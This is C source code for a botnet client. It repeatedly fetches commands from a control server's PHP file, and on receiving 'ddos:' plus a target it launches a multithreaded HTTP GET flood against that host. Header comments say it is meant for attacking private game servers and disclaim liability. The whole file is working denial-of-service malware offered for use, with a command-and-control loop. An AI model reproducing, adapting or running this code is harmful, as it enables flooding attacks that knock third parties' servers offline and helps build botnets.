#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>

// this is for ddosing aqw private servers only
// i am not liable if you use this for illegal purposes
// nor am i responsible for the actions you take while
// using this program, be careful.

#define cp "127.0.0.1" // control panel ip or domain
#define filecontrol "appcontrol.php" // control file
#define threads 100 // threads for ddos

struct sockaddr_in sa;

int makeconn() {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  return fd;
 } else {
  close(fd);
  return 0;
 }
}

void *ddog(void *target) {
 struct sockaddr_in tgt;
 struct hostent *host;
 if((host = gethostbyname((char *)target))) {
  tgt.sin_addr.s_addr = *((unsigned int *)host->h_addr);
  tgt.sin_port = htons(80);
  tgt.sin_family = AF_INET;
  char *req_dos = malloc(1024); 
  sprintf(req_dos, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n", (char *)target);
  int fd = socket(AF_INET, SOCK_STREAM, 0); 
  if(connect(fd, (struct sockaddr *)&tgt, sizeof(tgt)) != -1) {
   send(fd, req_dos, strlen(req_dos), MSG_NOSIGNAL);
  }
  dprintf(1, "sent to %s\n", (char *)target);
  free(req_dos);
  close(fd);
  }
}

int ddos(char *target) {
 pthread_t thread[threads];
 int a = 0;
 for(a = 0; a < 60; a++) {
  for(int i = 0; i < threads; i++) {
   pthread_create(&thread[i], 0, &ddog, (void *)target);
  }
  for(int i = 0; i < threads; i++) {
   pthread_join(thread[i], 0);
  }
  sleep(1);
 }
}

int getcmd() {
 int fd;
 char *req_server = malloc(1024); 
 sprintf(req_server, "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n", filecontrol, cp);
 if((fd = makeconn())) {
  char *resp = malloc(1024);
  send(fd, req_server, strlen(req_server), MSG_NOSIGNAL);
  recv(fd, resp, 1024, MSG_NOSIGNAL); 
  if((strstr(resp, "ddos:") + 5) != 0) {
   char *target = strstr(resp, "ddos:") + 5;
   char *newl;
   if((newl = strstr(target, "\n")) || (newl = strstr(target, "\r"))) {
    newl[0] = 0;
   }
   dprintf(1, "ddosing %s\n", target);
   ddos(target);
  }
  close(fd);
  free(resp);
 }
 free(req_server);
}

int makesa() {
 struct hostent *host;
 host = gethostbyname(cp); 
 sa.sin_addr.s_addr = *((unsigned int *)host->h_addr);
 sa.sin_port = htons(80);
 sa.sin_family = AF_INET;
}

int main() {
 makesa();
 while(1) {
  getcmd();
 }
}
